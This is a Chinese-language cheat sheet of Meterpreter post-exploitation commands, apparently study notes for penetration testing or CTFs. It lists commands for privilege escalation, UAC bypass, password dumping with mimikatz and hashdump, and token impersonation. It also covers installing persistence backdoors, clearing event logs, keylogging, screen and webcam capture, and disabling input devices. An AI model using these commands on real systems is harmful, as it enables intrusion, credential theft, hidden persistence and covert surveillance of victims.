# MeterPreter的作用

- **Mterpreter除了持久化控制，其他的操作都是在内存中完成的，不会写进物理磁盘，重启之后各种痕迹就会消失了**

---

# 后渗透中的一些例子

- **权限提升**

  - `getsystem`：直接提权

  - `bypassuac`:绕过UAC控制 `使用exploit/windows/local/bypassuac模块`

  - 利用windows的提权漏洞:`post/windows/gather/enum_patches模块用来枚举可能存在的漏洞`

  - 域管理员嗅探：`post/windows/gather/enum_domain`

  - 抓取密码:`load mimikatz => wdigest`或者使用`post/windows/gather/hashdump`模块进行渗透

  - 假冒令牌：`use incognito`模块

    - ```shell
      list_tokens[-g][-u]:列出可用的令牌
      impersonate_token TokenName:假冒指定的令牌
      ```

  - 端口转发【主要是针对一些在内网限制了出入的端口】：

    - `portfwd delete -l portnum:删除指定的端口`
    - `portfwd list：查看端口转发列表`
    - `portfwd add -l 端口号 -p 要被映射的端口号 -r IP地址`

  - 搜索文件

    - serch -f  \*flag*:搜索所有包含flag的文件

  - 抓包：`use sniffer`

    - `sniffer_interfaces:查看网卡`
    - `sniffer_start num：抓取第几个网卡的数据包`
    - `sniffer_dump num path`:导出第几个网卡的数据包pcap文件
    - `sniffer_stop num:`停止抓包，指定第几块网卡

  - 开启远程桌面服务

    - `run getgui -u 账号名称 -p 密码`

      //会新建一个账户，最后删掉就行

  - 日志清除：`clearev`

  - 留后门：

    - 01：`run metsvc`:通过安装系统服务连接后门
    - 02：`run persistence -U -i connectnum -p lport -r lhost`：通过自启动安装后门

  - 键盘记录

    - `keyscan_start`：开启键盘记录
    - `keyscan_dump`:导出记录结果
    - `keyscan_stop`：停止键盘记录

  - 进程注入

    - `migrate pid`：迁移到指定pid的进程中，可以使用ps查看所有进程

  - 截图

    - `use espia`
    - `screengrap`

  - 截图可以用eog工具查看图片，meterpreter下的screenshot命令也可以截图

  ---

- **Mterpreter的后渗透攻击模块**

  - `use post/windows/gather/forensics/enum_drives`:获取目标机器分区情况
  - `run  post/windows/gather/checkvm`：判断目标及其是否为虚拟机
  - `run post/windows/gather/dumplinks`：目标主机最近进行的系统操作，访问文件和office文档操作记录
  - `run post/windows/gather/enum_applications`：获取目标机器的系统安装程序和补丁情况

- **Mterpreter中常用的一些操作**

  - `uictl[enable/disable][keyboard/mouse]:开启或者禁止鼠标/键盘`

  - `webcam命令`

    - ```shell
      webcam_list#查看可用摄像头
      webcam_snap#通过摄像头拍照
      webcam_snap#通过摄像头开启视频
      ```

  

